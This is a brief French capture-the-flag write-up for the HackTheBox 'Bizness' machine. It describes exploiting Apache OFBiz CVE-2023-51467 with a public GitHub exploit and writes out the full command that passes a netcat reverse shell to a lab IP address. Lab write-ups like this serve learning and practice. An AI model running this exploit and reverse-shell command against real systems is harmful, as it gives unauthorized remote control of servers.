# BIZNESS

## Process

Alors difficle de savoir par quoi commencer, même si je pense qu'aprés analyse du nmap il vas nous faire un tunel forwarding! 
Je reviens par la des que j'ai plus d'idées! <br/>

Dirseach réussi bloquer dessus car oublie de mettre `https` a la place de `http`!! rrrrrr

Alors en arrivant sur la page je vois que le site run sur `apache ofbiz release 18.12` je regarde donc sur internet et constate une vulnérabilité! La `CVE-2023-51467` est repertorier en rapport avec un bypass de password!
Je trouve un exploit github [source](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) avec celle ci j'exécute le code donné! et constate une proof of concept!

Ne reste plus qu'a trouver la commande a entrer pour pouvoir prendre le control de la machines!

La commande est :
```bash
python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.6 443'
```

J'ai maintenant donc un reverse shell et j'arrive a choper le user flag.

## Root flag

Avec un tour sur un walktrought car je suis loin d'étre asser bon pour savoir ou chercher... On me dit que je dois chercher une database derby voyons si j'arrive a me débrouiller avec ca!

J'ai complétement suivi le walktrought trouver sur le net pour faire celle ci. :((((